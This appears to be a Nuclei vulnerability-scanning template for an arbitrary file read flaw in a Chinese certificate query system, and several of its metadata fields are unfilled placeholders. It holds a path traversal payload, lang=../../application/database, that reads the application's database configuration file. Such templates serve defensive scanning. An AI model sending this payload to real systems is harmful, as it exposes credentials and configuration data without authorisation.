id: zscx-lang-lfi
info:
  name: Template Name
  author: wangzong
  severity: high
  description: 证书查询系统存在任意文件读取漏洞
  reference:
    - https://
  tags: tags
http:
  - method: GET
    path:
      - "{{BaseURL}}/index/ajax/lang?lang=../../application/database"


    matchers:
      - type: word
        part: body
        words:
          - 'jsonpReturn'
